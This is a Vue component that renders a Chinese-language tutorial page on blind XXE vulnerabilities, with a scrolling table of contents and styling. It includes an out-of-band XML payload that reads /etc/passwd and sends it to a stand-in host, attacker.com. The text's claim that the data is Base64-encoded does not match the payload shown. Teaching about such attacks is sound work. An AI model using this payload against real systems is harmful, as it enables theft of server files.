<template>
        <div>
                <div id="xss-test"></div>
                <div>
                        <el-row>
                                <el-col :span="19">
                                        <div ref="containerRef" style="color: #fff;height: 650px; overflow-y: auto">
                                                <div id="part0" style="height: 100px;"></div>
                                                <div id="part2" style="height: auto;">
                                                        <el-text size="large" style="color:#fff; line-height: 3.6;">
                                                                <div id="p2" style="height: auto;">
                                                                        <h1 class="title">无回显的XXE漏洞</h1>
                                                                        <el-divider />
                                                                        <br>
                                                                        <h2 class="sub-title" id="p2-1">原理</h2>
                                                                        <p>当攻击者构造包含恶意外部实体引用的 <el-tag style="color:#e1567b"
                                                                                        type="info" size="large">XML</el-tag>
                                                                                数据,并将其提交给存在漏洞的应用程序时,应用程序的 <el-tag
                                                                                        style="color:#e1567b" type="info"
                                                                                        size="large">XML</el-tag>
                                                                                解析器会尝试加载并解析这些外部实体.与有回显的<el-tag
                                                                                        style="color:#e1567b" type="info"
                                                                                        size="large">XXE</el-tag>漏洞不同,无回显的<el-tag
                                                                                        style="color:#e1567b" type="info"
                                                                                        size="large">XXE</el-tag>漏洞中,服务器不会直接将外部实体的内容回显给攻击者.<br>
                                                                                这可能是由于应用程序的设计,或者在处理<el-tag style="color:#e1567b"
                                                                                        type="info"
                                                                                        size="large">XML</el-tag>数据时没有将实体内容包含在响应中.<br>
                                                                                但攻击者仍然可以通过一些间接的方式来利用这个漏洞,例如触发服务器向攻击者控制的服务器发送请求,从而获取敏感信息.
                                                                        </p>
                                                                        <br>
                                                                        <h2 class="sub-title" id="p2-2">攻击手段</h2>
                                                                        <br>
                                                                        <ul>
                                                                                <li>
                                                                                        <h3 class="sub-sub-title" id="p2-2-1">
                                                                                                带外数据泄露(OOB)
                                                                                        </h3>
                                                                                        <p>攻击者可以通过构造XML实体,让服务器向攻击者控制的服务器发送请求,从而实现数据泄露.以下是一个详细的示例:
                                                                                        </p>
                                                                                        <el-card style="max-width:900px; background-color:#282C34;"
                                                                                                body-style="line-height: 2">
                                                                                                <pre class="code-github-dark">
                                <code>
                                  &lt;?<span class="func">xml</span>&nbsp;<span class="num">version</span>="<span class="v">1.0</span>"&nbsp;<span class="num">encoding</span>="<span class="v">UTF-8</span>"?&gt;<br>
                                  &lt;<span class="lev0">!DOCTYPE</span> <span class="v">root</span> [<br>
                                  &nbsp;&nbsp;&nbsp;&nbsp;&lt;!<span class="num">ENTITY</span>
                                  <span class="key"> % </span>
                                  <span class="v">file</span> <span class="num">SYSTEM</span>
                                  "<span class="lev2">file:///etc/passwd</span>"&gt;<br>
                                  &nbsp;&nbsp;&nbsp;&nbsp;&lt;!<span class="num">ENTITY</span>
                                  <span class="key"> %</span>
                                  <span class="v">eval</span> "&lt;!<span class="num">ENTITY</span> <span class="key">&#x25; </span>
                                  <span class="v">exfiltrate</span>
                                  <span class="num"> SYSTEM</span> '<span class="lev2">http://attacker.com/?data=<span class="key">%</span><span class="v">file</span>;'></span>
                                  "&gt;<br>
                                  &nbsp;&nbsp;&nbsp;&nbsp;<span class="key">%</span><span class="v">eval</span>;<br>
                                  &nbsp;&nbsp;&nbsp;&nbsp;<span class="key">%</span><span class="v">exfiltrate</span>;<br>
                                  ]&gt;<br>
                                  &lt;<span class="func">root</span>&gt;&lt;/<span class="func">root</span>&gt;
                                </code>
                              </pre>
                                                                                        </el-card>
                                                                                        <p>在这个示例中,定义了一个名为 <el-tag
                                                                                                        style="color:#e1567b"
                                                                                                        type="info">file</el-tag>
                                                                                                的外部实体,其引用的资源是
                                                                                                <el-tag style="color:#e1567b"
                                                                                                        type="info">file:///etc/passwd</el-tag>.<br>
                                                                                                然后通过嵌套实体定义,构造了一个向攻击者控制的服务器发送请求的实体
                                                                                                <el-tag style="color:#e1567b"
                                                                                                        type="info">exfiltrate</el-tag>.<br>
                                                                                                当服务器解析该
                                                                                                <el-tag style="color:#e1567b"
                                                                                                        type="info"
                                                                                                        size="large">XML</el-tag>
                                                                                                文档时,会将 <el-tag
                                                                                                        style="color:#e1567b"
                                                                                                        type="info">/etc/passwd</el-tag>
                                                                                                文件的内容进行
                                                                                                <el-tag style="color:#e1567b"
                                                                                                        type="info"
                                                                                                        size="large">Base64</el-tag>
                                                                                                编码,<br>并将编码后的数据作为参数发送到攻击者控制的服务器上.
                                                                                        </p>
                                                                                </li>
                                                                                <br>
                                                                        </ul>
                                                                </div>
                                                        </el-text>
                                                </div>
                                        </div>
                                </el-col>
                                <el-col :span="5">
                                        <el-menu :default-active="activeAnchor" class="tech-anchor" mode="vertical"
                                                @select="handleAnchorSelect">
                                                <el-menu-item-group title="本页目录">
                                                        <el-menu-item index="p2">无回显的XXE漏洞</el-menu-item>
                                                        <el-sub-menu index="p2-sub">
                                                                <template #title>
                                                                        <span>详细内容</span>
                                                                </template>
                                                                <el-menu-item index="p2-1">原理</el-menu-item>
                                                                <el-menu-item index="p2-2">攻击手段</el-menu-item>
                                                                <el-menu-item index="p2-2-1">带外数据泄露(OOB)</el-menu-item>
                                                        </el-sub-menu>
                                                </el-menu-item-group>
                                        </el-menu>
                                </el-col>
                        </el-row>
                </div>
        </div>
</template>
      
<script>
export default {
        data() {
                return {
                        activeAnchor: '',
                };
        },
        mounted() {
                this.$refs.containerRef.addEventListener('scroll', this.handleScroll);
                this.handleScroll();
        },
        beforeDestroy() {
                this.$refs.containerRef.removeEventListener('scroll', this.handleScroll);
        },
        methods: {
                handleAnchorSelect(index) {
                        const element = document.getElementById(index);
                        if (element) {
                                element.scrollIntoView({ behavior: 'smooth' });
                        }
                },
                handleScroll() {
                        const container = this.$refs.containerRef;
                        const sections = ['p2-1', 'p2-2', 'p2-2-1'];
                        for (let i = sections.length - 1; i >= 0; i--) {
                                const section = document.getElementById(sections[i]);
                                if (section.offsetTop - container.scrollTop <= 60) {
                                        this.activeAnchor = sections[i];
                                        break;
                                }
                        }
                },
        },
};
</script>

<style lang="less" scoped>
code {
font-family: "Cascadia Code";
}

.code-block {
color: #c9d1d9;
font-family: 'Cascadia Code', Consolas, 'Liberation Mono', Menlo, monospace;
font-size: 15px;
margin: 0;
}

.token.comment {
color: #8b949e;
}

.token.keyword {
color: #ff7b72;
}

.token.function {
  color: #d2a8ff;
}

.token.variable {
color: #79c0ff;
}

.token.string {
color: #a5d6ff;
}

.token.punctuation {
color: #c9d1d9;
}

.token.operator {
  // 原样式内容，可根据实际情况补充
  color: #ff7b72;
}

/* el-tag 样式 */
.el-tag {
background-color: #3d3b3b;
color: #fff;
border-color: #282C34;
}

/* el-card 样式 */
.el-card {
background-color: #282C34;
color: #fff;
border-color: #282C34;
}

/* el-text 样式 */
.el-text {
color: #fff;
}

h1.title {
  margin: 0 0 3rem;
  font-size: 38px;
  line-height: 1.4;
  letter-spacing: -.02em;
  font-weight: 800;
  text-align: left;
  font-family: 'Orbitron','微软雅黑';
}

h2.sub-title {
  margin: 0 0 3rem;
  font-size: 25px;
  line-height: 1.4;
  letter-spacing: -.02em;
  font-weight: 800;
  text-align: left;
  font-family: 'Orbitron','微软雅黑';
}

h3.sub-sub-title {
  margin: 0 0 3rem;
  font-size: 20px;
  line-height: 1.4;
  letter-spacing: -.02em;
  font-weight: 800;
  text-align: left;
  font-family: 'Orbitron','微软雅黑';
}

.v {
  color: #4cbcec;
  font-family: 'Cascadia Code';
}

.key {
  color: #e1567b;
  font-family: 'Cascadia Code';
}

.lev0 {
  color: #f0de18;
  font-family: 'Cascadia Code';
}

.lev1 {
  color: rgb(238, 65, 195);
  font-family: 'Cascadia Code';
}

.lev2 {
  color: #239af5;
  font-family: 'Cascadia Code';
}

.func {
  color: #84D49C;
  /* color:#434040 */
  font-family: 'Cascadia Code';
}

.txt {
  font-family: 'Cascadia Code';
}

.code {
  color: #fff;
  font-family: 'Cascadia Code';
}

.cmt {
  color:rgb(99, 97, 97);
  font-family: 'Cascadia Code';
  font-size: 15px
}

.num {
  color: #8e40ce;
  font-family: 'Cascadia Code';
}

/* el-tag 样式 */
.el-tag {
  background-color: #3d3b3b;
  color: #fff;
  border-color: #282C34;
}

/* el-card 样式 */
.el-card {
  background-color: #282C34;
  color: #fff;
  border-color: #282C34;
}

/* el-text 样式 */
.el-text {
  color: #fff;
}

/* 菜单容器样式 */
.tech-anchor {
  --el-anchor-padding: 0 0 0 20px;
  --el-anchor-border-width: 0;
  --el-anchor-marker-height: 100%;
  --el-anchor-marker-width: 2px;
  background: rgba(10, 17, 40, 0.7);
  border-radius: 4px;
  padding: 15px;
  box-shadow: 0 0 15px rgba(0, 123, 255, 0.1);
  border-left: 1px solid rgba(0, 123, 255, 0.3);
}

/* 强制覆盖子菜单项的背景色 */
::v-deep .tech-anchor .el-sub-menu .el-menu,
::v-deep .tech-anchor .el-sub-menu .el-menu-item {
  background-color: transparent !important;
}

/* 子菜单内容区域样式 - 添加深色背景 */
::v-deep .tech-anchor .el-sub-menu .el-menu {
  background-color: rgba(5, 12, 30, 0.7) !important;
  border-left: 1px solid rgba(0, 123, 255, 0.2);
  margin-left: 10px;
  padding-left: 5px;
}

/* 菜单项基础样式 - 确保子菜单项也被覆盖 */
::v-deep .tech-anchor .el-menu-item,
::v-deep .tech-anchor .el-sub-menu .el-menu-item {
  color: #a0c4ff !important;
  background-color: transparent !important;
  font-family: 'Cascadia Code', '微软雅黑';
  font-size: 0.9em;
  padding: 5px 10px;
  border-radius: 3px;
  transition: all 0.3s ease;
  position: relative;
}

/* 子菜单标题样式 */
::v-deep .tech-anchor .el-sub-menu__title {
  color: #a0c4ff !important;
  background-color: transparent !important;
  font-family: 'Cascadia Code', '微软雅黑';
  font-size: 0.9em;
  padding: 5px 10px;
  border-radius: 3px;
  transition: all 0.3s ease;
  position: relative;
}

/* 菜单项悬停效果 */
::v-deep .tech-anchor .el-menu-item:hover,
::v-deep .tech-anchor .el-sub-menu .el-menu-item:hover,
::v-deep .tech-anchor .el-sub-menu__title:hover {
  color: #ffffff !important;
  background: rgba(0, 123, 255, 0.2) !important;
  text-shadow: 0 0 5px #007bff;
  transform: translateX(5px);
}

/* 激活菜单项样式 */
::v-deep .tech-anchor .el-menu-item.is-active,
::v-deep .tech-anchor .el-sub-menu .el-menu-item.is-active {
  color: #ffffff !important;
  background: rgba(0, 123, 255, 0.3) !important;
  text-shadow: 0 0 10px #00a2ff;
  border-left: 2px solid #007bff;
  padding-left: 15px;
  animation: pulse-glow 2s infinite alternate;
}

/* 确保所有层级的子菜单都有正确的背景 */
::v-deep .tech-anchor .el-sub-menu .el-sub-menu .el-menu {
  background-color: rgba(2, 8, 20, 0.7) !important;
}

/* 响应式调整 */
@media (max-width: 768px) {
  .tech-anchor {
    padding: 10px;
  }

  ::v-deep .tech-anchor .el-sub-menu .el-menu {
    margin-left: 5px;
  }
}
</style>